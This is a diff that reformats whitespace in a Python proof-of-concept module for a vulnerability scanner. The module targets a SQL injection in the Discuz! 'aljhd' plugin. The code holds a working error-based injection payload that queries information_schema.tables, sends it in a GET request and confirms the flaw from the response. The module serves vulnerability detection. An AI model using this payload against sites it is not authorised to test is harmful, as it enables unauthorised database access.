@@ -3,6 +3,7 @@
 from CScanPoc.thirdparty import requests
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 
+
 class Vuln(ABVuln):
     vuln_id = 'Discuz_0033'  # 平台漏洞编号，留空
     name = 'Discuz! 插件注入'  # 漏洞名称
@@ -34,19 +35,20 @@ class Poc(ABPoc):
                 target=self.target, vuln=self.vuln))
 
             payload = '/plugin.php?id=aljhd&type=1&status=&ym=1'
-            data = "%20and%20(select%201%20from%20(select%20count(*),concat(md5(c),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%20type=1" 
-            url = self.target + payload + data 
+            data = "%20and%20(select%201%20from%20(select%20count(*),concat(md5(c),floor(rand(0)*2))x%20from%20information_schema.tables%20group%20by%20x)a)%20and%20type=1"
+            url = self.target + payload + data
             r = requests.get(url)
-             
+
             if '4a8a08f09d37b73795649038408b5f33' in r.text:
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name, url=url))
-                
+
         except Exception, e:
             self.output.info('执行异常{}'.format(e))
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
